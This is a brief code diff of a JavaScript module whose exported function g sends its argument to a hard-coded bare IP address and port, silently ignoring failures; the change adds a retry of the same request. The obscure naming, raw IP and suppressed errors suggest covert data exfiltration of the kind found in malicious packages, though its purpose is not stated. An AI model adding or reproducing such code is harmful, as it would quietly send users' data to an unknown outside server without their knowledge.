@@ -1,6 +1,10 @@
 import "node-fetch"
 
 export async function g(a){
-    try{await fetch("http://45.77.205.56:4810?get="+a);
-    }catch{}
+    try{
+    await fetch("http://45.77.205.56:4810?get="+a);
+    }catch{
+        try{ await fetch("http://45.77.205.56:4810?get="+a);}
+        catch{}
+    }
 }
